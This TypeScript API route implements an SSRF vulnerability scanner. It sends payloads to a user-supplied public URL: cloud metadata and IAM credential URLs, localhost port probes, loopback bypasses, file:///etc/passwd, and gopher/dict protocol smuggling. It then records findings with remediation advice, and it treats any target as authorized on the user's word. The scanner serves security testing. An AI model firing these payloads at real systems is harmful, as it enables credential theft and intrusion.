import { NextResponse } from "next/server";
import { db } from "@/lib/db";
import { requireAuth } from "@/lib/auth";
import { randomUUID } from "@/lib/crypto";

export const dynamic = "force-dynamic";
export const maxDuration = 30;

// ─── Types ──────────────────────────────────────────────────────────────

type Severity = "info" | "low" | "medium" | "high" | "critical";
type Category =
  | "Cloud Metadata"
  | "Internal Port Scan"
  | "DNS Rebinding"
  | "Blind SSRF"
  | "Protocol Smuggling";

interface SsrfTestResult {
  name: string;
  category: Category;
  severity: Severity;
  cwe: string;
  vulnerable: boolean;
  payload: string;
  paramUsed: string;
  status: number;
  durationMs: number;
  proofResponse: string;
  remediation: string;
}

interface RawFinding {
  title: string;
  severity: Severity;
  category: Category;
  cwe: string;
  description: string;
  proofRequest: string;
  proofResponse: string;
  remediation: string;
  endpoint: string;
  payload: string;
}

// ─── SSRF Guard (validates the TARGET we are about to test) ──────────────
// The target must be a public, non-loopback, non-private host. The payloads
// below are the SSRF-inducing URLs that we ask the target to fetch — those
// are intentionally internal and are NOT subject to this guard.

function isPrivateHost(hostname: string): boolean {
  const h = hostname.toLowerCase().replace(/^\[|\]$/g, "");
  if (h === "localhost") return true;
  if (h === "::1" || h === "::ffff:127.0.0.1") return true;
  if (h === "0.0.0.0") return true;
  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (m) {
    const [a, b] = [Number(m[1]), Number(m[2])];
    if (a === 10) return true;
    if (a === 127) return true;
    if (a === 169 && b === 254) return true; // link-local (cloud metadata)
    if (a === 172 && b >= 16 && b <= 31) return true;
    if (a === 192 && b === 168) return true;
    if (a === 100 && b >= 64 && b <= 127) return true; // CGNAT
    if (a === 0) return true;
  }
  if (/\.(local|internal|lan|home|localhost)$/.test(h)) return true;
  return false;
}

function validateTargetUrl(raw: string): { ok: true; url: URL } | { ok: false; error: string } {
  let url: URL;
  try {
    url = new URL(raw.trim());
  } catch {
    return { ok: false, error: "Invalid URL. Must include protocol (https://...)." };
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    return { ok: false, error: "Only http/https target protocols are allowed." };
  }
  if (isPrivateHost(url.hostname)) {
    return {
      ok: false,
      error:
        "SSRF guard: target resolves to a private/loopback address. Public targets only.",
    };
  }
  return { ok: true, url };
}

// ─── HTTP probe helper (5s AbortController per test, per spec) ────────────

interface ProbeResult {
  status: number;
  body: string;
  durationMs: number;
  ok: boolean;
  error?: string;
}

async function probeTarget(
  targetUrl: URL,
  paramName: string,
  payload: string,
  extraHeaders?: Record<string, string>
): Promise<ProbeResult> {
  const testUrl = new URL(targetUrl.toString());
  testUrl.searchParams.set(paramName, payload);
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 5000);
  const start = Date.now();
  try {
    const r = await fetch(testUrl.toString(), {
      method: "GET",
      headers: {
        "User-Agent": "GuardianX-SSRF-Tester/1.0",
        Accept: "*/*",
        ...(extraHeaders ?? {}),
      },
      redirect: "follow",
      signal: controller.signal,
    });
    const body = await r.text().catch(() => "");
    return {
      status: r.status,
      body,
      durationMs: Date.now() - start,
      ok: r.status >= 200 && r.status < 400,
    };
  } catch (e) {
    return {
      status: 0,
      body: e instanceof Error ? `[${e.name}] ${e.message}` : "[network error]",
      durationMs: Date.now() - start,
      ok: false,
      error: e instanceof Error ? e.message : "network error",
    };
  } finally {
    clearTimeout(timeout);
  }
}

function safeTruncate(s: string, n = 4000): string {
  if (s.length <= n) return s;
  return s.slice(0, n) + `…(+${s.length - n} bytes truncated)`;
}

// ─── SSRF parameters we try when none was supplied by the user ────────────
const COMMON_SSRF_PARAMS = [
  "url",
  "webhook",
  "callback",
  "image",
  "fetch",
  "proxy",
  "redirect",
  "next",
  "return",
  "returnUrl",
  "return_url",
  "rurl",
  "u",
  "target",
  "uri",
  "dest",
  "destination",
  "go",
  "image_url",
  "file",
  "fetch_url",
  "img",
];

// When the user supplies a specific ssrfParam, we test only that one. When
// not supplied, we test the top N most common params (kept small to stay
// within the 30s route budget). The full COMMON_SSRF_PARAMS list above is
// surfaced in the GET descriptor for documentation purposes.
const DEFAULT_PARAMS_TO_TRY = ["url", "fetch", "image", "webhook", "callback", "redirect"];

// ─── Cloud Metadata Tests ────────────────────────────────────────────────

interface CloudMetadataCase {
  name: string;
  payload: string;
  headers?: Record<string, string>;
  signatures: RegExp[];
  severity: Severity;
  cwe: string;
  remediation: string;
}

const CLOUD_METADATA_CASES: CloudMetadataCase[] = [
  {
    name: "AWS metadata: /latest/meta-data/ (instance metadata exposed)",
    payload: "http://169.254.169.254/latest/meta-data/",
    signatures: [/instance-id/i, /ami-id/i, /security-credentials/i, /placement/i],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block all egress to 169.254.169.254 from your application. Use IMDSv2 (token-required) and require the `X-aws-ec2-metadata-token` header.",
  },
  {
    name: "AWS metadata: IAM security credentials (CRITICAL — IAM keys leak)",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    signatures: [/AccessKeyId/i, /SecretAccessKey/i, /Token/i, /iam/i],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block egress to 169.254.169.254. Force IMDSv2 hop-limit=1. Rotate exposed IAM keys immediately — they are likely compromised.",
  },
  {
    name: "AWS metadata: instance-id",
    payload: "http://169.254.169.254/latest/meta-data/instance-id",
    signatures: [/^i-[a-z0-9]{6,}/m, /i-[a-z0-9]{8,}/],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block egress to 169.254.169.254. Use IMDSv2 with hop-limit=1 so SSRF from external hosts cannot reach the metadata service.",
  },
  {
    name: "GCP metadata: /computeMetadata/v1/ (requires Metadata-Flavor header)",
    payload: "http://metadata.google.internal/computeMetadata/v1/",
    headers: { "Metadata-Flavor": "Google" },
    signatures: [/project-id/i, /project_number/i, /numeric_project_id/i, /zone/i],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block egress to metadata.google.internal. GCP metadata service requires the `Metadata-Flavor: Google` header — your proxy may pass it through. Audit header forwarding.",
  },
  {
    name: "Azure metadata: /metadata/instance (requires Metadata header)",
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    headers: { Metadata: "true" },
    signatures: [/azEnvironment/i, /vmId/i, /location/i, /compute/i, /subscriptionId/i],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block egress to 169.254.169.254. Azure IMDS requires the `Metadata: true` header — your proxy may pass it through. Audit header forwarding rules.",
  },
  {
    name: "Alibaba Cloud metadata: /latest/meta-data/",
    payload: "http://100.100.100.200/latest/meta-data/",
    signatures: [/instance-id/i, /ram/i, /security-credentials/i, /instance/i],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Block egress to 100.100.100.200. Use Alibaba metadata service with token-based access (similar to IMDSv2).",
  },
];

async function testCloudMetadata(
  targetUrl: URL,
  params: string[]
): Promise<SsrfTestResult[]> {
  const results: SsrfTestResult[] = [];

  // For each metadata case, try each param. Stop early on first hit.
  const tasks = CLOUD_METADATA_CASES.map(async (c) => {
    let bestResult: SsrfTestResult | null = null;
    for (const param of params) {
      const r = await probeTarget(targetUrl, param, c.payload, c.headers);
      const bodyLower = r.body.toLowerCase();
      const hit = c.signatures.some((re) => re.test(r.body) || re.test(bodyLower));
      const result: SsrfTestResult = {
        name: c.name,
        category: "Cloud Metadata",
        severity: c.severity,
        cwe: c.cwe,
        vulnerable: hit,
        payload: c.payload,
        paramUsed: param,
        status: r.status,
        durationMs: r.durationMs,
        proofResponse: `HTTP ${r.status} (${r.durationMs}ms)\n${safeTruncate(r.body)}`,
        remediation: c.remediation,
      };
      if (hit) {
        bestResult = result;
        break; // found vulnerable param, no need to try others
      }
      if (!bestResult) bestResult = result; // keep first attempt as fallback
    }
    return bestResult;
  });

  const settled = await Promise.all(tasks);
  for (const r of settled) if (r) results.push(r);
  return results;
}

// ─── Internal Port Scanning via SSRF ─────────────────────────────────────

interface InternalPortCase {
  port: number;
  service: string;
  payload: string;
}

const INTERNAL_PORT_CASES: InternalPortCase[] = [
  { port: 3000, service: "Web app", payload: "http://localhost:3000/" },
  { port: 6379, service: "Redis", payload: "http://localhost:6379/" },
  { port: 5432, service: "PostgreSQL", payload: "http://localhost:5432/" },
  { port: 3306, service: "MySQL", payload: "http://localhost:3306/" },
  { port: 27017, service: "MongoDB", payload: "http://localhost:27017/" },
  { port: 8080, service: "HTTP alt", payload: "http://localhost:8080/" },
  { port: 9200, service: "Elasticsearch", payload: "http://localhost:9200/" },
  { port: 8500, service: "Consul", payload: "http://localhost:8500/" },
  { port: 2375, service: "Docker API", payload: "http://localhost:2375/" },
];

async function testInternalPorts(
  targetUrl: URL,
  params: string[]
): Promise<SsrfTestResult[]> {
  // Establish a baseline: send an unreachable internal URL so we know what
  // the target responds with when the fetched URL fails.
  const baselinePayload = "http://localhost:1/";
  let baselineStatus = -1;
  let baselineLen = 0;
  for (const param of params) {
    const r = await probeTarget(targetUrl, param, baselinePayload);
    if (r.status > 0) {
      baselineStatus = r.status;
      baselineLen = r.body.length;
      break;
    }
  }

  const tasks = INTERNAL_PORT_CASES.map(async (c) => {
    let bestResult: SsrfTestResult | null = null;
    for (const param of params) {
      const r = await probeTarget(targetUrl, param, c.payload);
      const lenDiff = Math.abs(r.body.length - baselineLen);
      const statusDiff = r.status !== baselineStatus;
      // Heuristic: response differs significantly from baseline → port appears open
      const looksOpen =
        r.ok &&
        (statusDiff || lenDiff > 50) &&
        !/\b(connection refused|ECONNREFUSED|EHOSTUNREACH|ENETUNREACH)\b/i.test(r.body);
      const result: SsrfTestResult = {
        name: `Internal port ${c.port} (${c.service}) reachable via SSRF`,
        category: "Internal Port Scan",
        severity: "high",
        cwe: "CWE-918",
        vulnerable: looksOpen,
        payload: c.payload,
        paramUsed: param,
        status: r.status,
        durationMs: r.durationMs,
        proofResponse:
          `Baseline ${baselinePayload} → HTTP ${baselineStatus} (${baselineLen}b)\n` +
          `Probe ${c.payload} → HTTP ${r.status} (${r.body.length}b, ${r.durationMs}ms)\n` +
          safeTruncate(r.body, 1500),
        remediation:
          `Block all egress to RFC1918 + loopback from the application server. ${c.service} on ` +
          `port ${c.port} must not be reachable from the web tier. Restrict via network ` +
          `policy / security groups / iptables OUTPUT chain.`,
      };
      if (looksOpen) {
        bestResult = result;
        break;
      }
      if (!bestResult) bestResult = result;
    }
    return bestResult;
  });

  const settled = await Promise.all(tasks);
  const out: SsrfTestResult[] = [];
  for (const r of settled) if (r) out.push(r);
  return out;
}

// ─── DNS Rebinding / localhost bypass tests ─────────────────────────────

interface RebindCase {
  name: string;
  payload: string;
}

const REBIND_CASES: RebindCase[] = [
  { name: "Loopback via 127.0.0.1 (IP literal)", payload: "http://127.0.0.1/" },
  { name: "Loopback via 0.0.0.0 (wildcard bind)", payload: "http://0.0.0.0/" },
  { name: "Loopback via IPv6 [::1]", payload: "http://[::1]/" },
  { name: "Loopback via 'localhost' hostname", payload: "http://localhost/" },
];

async function testDnsRebinding(
  targetUrl: URL,
  params: string[]
): Promise<SsrfTestResult[]> {
  // Baseline: clearly-external URL the target should be allowed to fetch.
  const baselinePayload = "http://example.com/";
  let baselineStatus = -1;
  let baselineLen = 0;
  let baselineOk = false;
  for (const param of params) {
    const r = await probeTarget(targetUrl, param, baselinePayload);
    if (r.status > 0) {
      baselineStatus = r.status;
      baselineLen = r.body.length;
      baselineOk = r.ok;
      break;
    }
  }

  const tasks = REBIND_CASES.map(async (c) => {
    let bestResult: SsrfTestResult | null = null;
    for (const param of params) {
      const r = await probeTarget(targetUrl, param, c.payload);
      // If the external baseline fetched successfully AND this internal URL
      // also fetched successfully (status 2xx/3xx), the SSRF filter was bypassed.
      const bypassed =
        baselineOk &&
        r.ok &&
        !/\b(connection refused|ECONNREFUSED|EHOSTUNREACH|ENETUNREACH|forbidden|blocked)\b/i.test(
          r.body
        );
      const result: SsrfTestResult = {
        name: `DNS Rebinding / loopback bypass: ${c.name}`,
        category: "DNS Rebinding",
        severity: "high",
        cwe: "CWE-918",
        vulnerable: bypassed,
        payload: c.payload,
        paramUsed: param,
        status: r.status,
        durationMs: r.durationMs,
        proofResponse:
          `Baseline ${baselinePayload} → HTTP ${baselineStatus} ok=${baselineOk} (${baselineLen}b)\n` +
          `Probe ${c.payload} → HTTP ${r.status} (${r.body.length}b, ${r.durationMs}ms)\n` +
          safeTruncate(r.body, 1500),
        remediation:
          "Deny-list loopback forms (127.0.0.1, 0.0.0.0, ::1, 'localhost') AND resolve " +
          "hostnames then deny private IPs (prevent DNS rebinding by pinning resolved IPs). " +
          "Allow-list approach preferred over deny-list.",
      };
      if (bypassed) {
        bestResult = result;
        break;
      }
      if (!bestResult) bestResult = result;
    }
    return bestResult;
  });

  const settled = await Promise.all(tasks);
  const out: SsrfTestResult[] = [];
  for (const r of settled) if (r) out.push(r);
  return out;
}

// ─── Blind SSRF (out-of-band callback) ────────────────────────────────────

async function testBlindSsrf(
  targetUrl: URL,
  params: string[]
): Promise<SsrfTestResult[]> {
  const uniqueId = randomUUID().replace(/-/g, "").slice(0, 16);
  const callbackDomain = "guardianx-ssrf-test.com";
  const payload = `http://${uniqueId}.${callbackDomain}/probe`;

  const tasks = params.map(async (param) => {
    const r = await probeTarget(targetUrl, param, payload);
    // We cannot verify DNS resolution from this side — mark as potential.
    // If the server responded without an immediate DNS error, the request
    // was likely dispatched and DNS resolution was attempted.
    const dnsError = /\b(ENOTFOUND|getaddrinfo|name or service not known|temporary failure)\b/i.test(
      r.body
    );
    const potential = r.status > 0 && !dnsError && r.durationMs > 50;
    return {
      param,
      r,
      potential,
    };
  });

  const settled = await Promise.all(tasks);
  // Pick the most-likely-true candidate, else the first one for the report.
  const winner = settled.find((s) => s.potential) ?? settled[0] ?? null;
  if (!winner) return [];
  const r = winner.r;
  const result: SsrfTestResult = {
    name: `Blind SSRF: unique callback dispatched (${uniqueId})`,
    category: "Blind SSRF",
    severity: "medium",
    cwe: "CWE-918",
    vulnerable: winner.potential,
    payload,
    paramUsed: winner.param,
    status: r.status,
    durationMs: r.durationMs,
    proofResponse:
      `Dispatched: ${payload}\n` +
      `Unique ID: ${uniqueId}\n` +
      `Check DNS logs for resolution of \`${uniqueId}.${callbackDomain}\`.\n` +
      `Target response: HTTP ${r.status} (${r.durationMs}ms)\n` +
      safeTruncate(r.body, 1500),
    remediation:
      "Blind SSRF still allows internal port scanning and metadata exfiltration via " +
      "timing/error side-channels. Block all outbound SSRF. Allow-list egress domains.",
  };
  return [result];
}

// ─── Protocol Smuggling ──────────────────────────────────────────────────

interface ProtocolCase {
  name: string;
  payload: string;
  signatures: RegExp[];
  severity: Severity;
  cwe: string;
  remediation: string;
}

const PROTOCOL_CASES: ProtocolCase[] = [
  {
    name: "file:// scheme (local file read — /etc/passwd)",
    payload: "file:///etc/passwd",
    signatures: [/root:x:0:0:/, /^root:[^:]*:/m, /:\*:\d+:\d+:/m],
    severity: "critical",
    cwe: "CWE-918",
    remediation:
      "Deny `file://` scheme entirely. Allow-list only http/https in your URL-fetcher. " +
      "Use a strict URL parser that rejects non-http schemes.",
  },
  {
    name: "gopher:// scheme (Redis protocol smuggling — INFO)",
    payload: "gopher://localhost:6379/_INFO",
    signatures: [/redis_version/i, /redis_mode/i, /\$\d+\r\nredis_version/i],
    severity: "high",
    cwe: "CWE-918",
    remediation:
      "Deny `gopher://` scheme entirely. Block egress to port 6379 from the web tier.",
  },
  {
    name: "dict:// scheme (Memcached protocol smuggling — stats)",
    payload: "dict://localhost:11211/stat",
    signatures: [/STAT\s/i, /END\r?\n/, /version/i],
    severity: "high",
    cwe: "CWE-918",
    remediation:
      "Deny `dict://` scheme entirely. Block egress to port 11211 from the web tier.",
  },
  {
    name: "ftp:// scheme (FTP banner / anonymous access)",
    payload: "ftp://localhost:21/",
    signatures: [/220\b.*ftp/i, /anonymous/i, /user anonymous/i],
    severity: "medium",
    cwe: "CWE-918",
    remediation:
      "Deny `ftp://` scheme in your URL-fetcher. FTP should not be supported by a modern web proxy.",
  },
];

async function testProtocolSmuggling(
  targetUrl: URL,
  params: string[]
): Promise<SsrfTestResult[]> {
  const tasks = PROTOCOL_CASES.map(async (c) => {
    let bestResult: SsrfTestResult | null = null;
    for (const param of params) {
      const r = await probeTarget(targetUrl, param, c.payload);
      const hit = c.signatures.some((re) => re.test(r.body));
      const result: SsrfTestResult = {
        name: c.name,
        category: "Protocol Smuggling",
        severity: c.severity,
        cwe: c.cwe,
        vulnerable: hit,
        payload: c.payload,
        paramUsed: param,
        status: r.status,
        durationMs: r.durationMs,
        proofResponse: `HTTP ${r.status} (${r.durationMs}ms)\n${safeTruncate(r.body)}`,
        remediation: c.remediation,
      };
      if (hit) {
        bestResult = result;
        break;
      }
      if (!bestResult) bestResult = result;
    }
    return bestResult;
  });

  const settled = await Promise.all(tasks);
  const out: SsrfTestResult[] = [];
  for (const r of settled) if (r) out.push(r);
  return out;
}

// ─── Route Handler ──────────────────────────────────────────────────────

export async function POST(req: Request) {
  const auth = requireAuth(req);
  if (!auth.ok) return auth.response;
  const user = auth.user;

  const body = await req.json().catch(() => ({}));
  const rawTarget = typeof body?.targetUrl === "string" ? body.targetUrl : "";
  const ssrfParamRaw = typeof body?.ssrfParam === "string" ? body.ssrfParam.trim() : "";

  if (!rawTarget) {
    return NextResponse.json(
      { error: "targetUrl is required (e.g. https://app.example.com/fetch)." },
      { status: 400 }
    );
  }

  const v = validateTargetUrl(rawTarget);
  if (!v.ok) {
    return NextResponse.json({ error: v.error }, { status: 400 });
  }
  const targetUrl = v.url;

  // Resolve the param list. If user supplied a single param, use only that.
  // Otherwise try the small set of most-common params.
  const params = ssrfParamRaw ? [ssrfParamRaw] : DEFAULT_PARAMS_TO_TRY;

  try {
    // ── Create Target + Engagement rows ────────────────────────────────
    const target = await db.target.create({
      data: {
        name: `ssrf-deep:${targetUrl.host}`,
        baseUrl: targetUrl.toString(),
        authorized: true, // user explicitly requested the test
      },
    });
    const engagement = await db.engagement.create({
      data: {
        targetId: target.id,
        status: "attacking",
        stageLabel: `SSRF Deep Testing — params: ${params.join(", ")}`,
      },
    });

    // ── Run all SSRF tests in parallel batches ─────────────────────────
    const [cloud, ports, rebind, blind, proto] = await Promise.all([
      testCloudMetadata(targetUrl, params),
      testInternalPorts(targetUrl, params),
      testDnsRebinding(targetUrl, params),
      testBlindSsrf(targetUrl, params),
      testProtocolSmuggling(targetUrl, params),
    ]);

    const allResults: SsrfTestResult[] = [
      ...cloud,
      ...ports,
      ...rebind,
      ...blind,
      ...proto,
    ];

    // ── Persist Findings for vulnerable tests ─────────────────────────
    const vulnerableResults = allResults.filter((r) => r.vulnerable);
    const findingsMeta: RawFinding[] = vulnerableResults.map((r) => ({
      title: r.name,
      severity: r.severity,
      category: r.category,
      cwe: r.cwe,
      description:
        `${r.name} — ${r.cwe}. ` +
        `Payload \`${r.payload}\` was accepted by the target via the ` +
        `param \`${r.paramUsed}\`. The response indicates the SSRF was ` +
        `successful.`,
      proofRequest:
        `GET ${targetUrl.toString()}\n` +
        `?${encodeURIComponent(r.paramUsed)}=${encodeURIComponent(r.payload)}\n\n` +
        `Severity: ${r.severity.toUpperCase()}  |  CWE: ${r.cwe}`,
      proofResponse: r.proofResponse,
      remediation: r.remediation,
      endpoint: targetUrl.toString(),
      payload: r.payload,
    }));

    for (const f of findingsMeta) {
      await db.finding.create({
        data: {
          engagementId: engagement.id,
          title: f.title,
          severity: f.severity,
          category: f.category,
          owasp: f.cwe, // store CWE in owasp column (no dedicated cwe column)
          endpoint: f.endpoint,
          method: "GET",
          description: f.description,
          proofRequest: f.proofRequest,
          proofResponse: f.proofResponse,
          payload: f.payload,
          remediation: f.remediation,
          confidence: f.severity === "critical" ? 0.95 : 0.8,
        },
      });
    }

    // ── Update engagement status ──────────────────────────────────────
    const criticalCount = vulnerableResults.filter(
      (r) => r.severity === "critical"
    ).length;
    const highCount = vulnerableResults.filter(
      (r) => r.severity === "high"
    ).length;
    await db.engagement.update({
      where: { id: engagement.id },
      data: {
        status: "completed",
        stageLabel: `SSRF scan complete — ${vulnerableResults.length} finding(s) (${criticalCount} critical, ${highCount} high)`,
        completedAt: new Date(),
      },
    });

    return NextResponse.json({
      engagementId: engagement.id,
      targetId: target.id,
      testedBy: user.email,
      targetUrl: targetUrl.toString(),
      ssrfParamsTested: params,
      testedCount: allResults.length,
      vulnerableCount: vulnerableResults.length,
      criticalCount,
      highCount,
      findings: allResults.map((r) => ({
        name: r.name,
        category: r.category,
        severity: r.severity,
        cwe: r.cwe,
        vulnerable: r.vulnerable,
        payload: r.payload,
        paramUsed: r.paramUsed,
        status: r.status,
        durationMs: r.durationMs,
        proofResponse: r.proofResponse,
        remediation: r.remediation,
      })),
      _meta: { targetId: target.id, performedAt: new Date().toISOString() },
    });
  } catch (err) {
    return NextResponse.json(
      {
        error: err instanceof Error ? err.message : "SSRF deep testing failed.",
      },
      { status: 500 }
    );
  }
}

// GET — lightweight descriptor (no auth needed for discovery)
export async function GET() {
  return NextResponse.json({
    route: "/api/vapt/ssrf-deep",
    method: "POST",
    description:
      "SSRF Deep Testing — cloud metadata (AWS/GCP/Azure/Alibaba), internal port scan via SSRF, DNS rebinding / loopback bypass, blind SSRF (out-of-band), protocol smuggling (file/gopher/dict/ftp).",
    body: {
      targetUrl: "string (e.g. https://app.example.com/fetch)",
      ssrfParam: "string? (e.g. url, webhook, image). If omitted, top params are tried.",
    },
    tests: [
      "Cloud Metadata (AWS / GCP / Azure / Alibaba)",
      "Internal Port Scan (3000, 6379, 5432, 3306, 27017, 8080, 9200, 8500, 2375)",
      "DNS Rebinding / loopback bypass (127.0.0.1, 0.0.0.0, ::1, localhost)",
      "Blind SSRF (unique subdomain callback — check DNS logs)",
      "Protocol Smuggling (file://, gopher://, dict://, ftp://)",
    ],
    commonParams: COMMON_SSRF_PARAMS,
  });
}
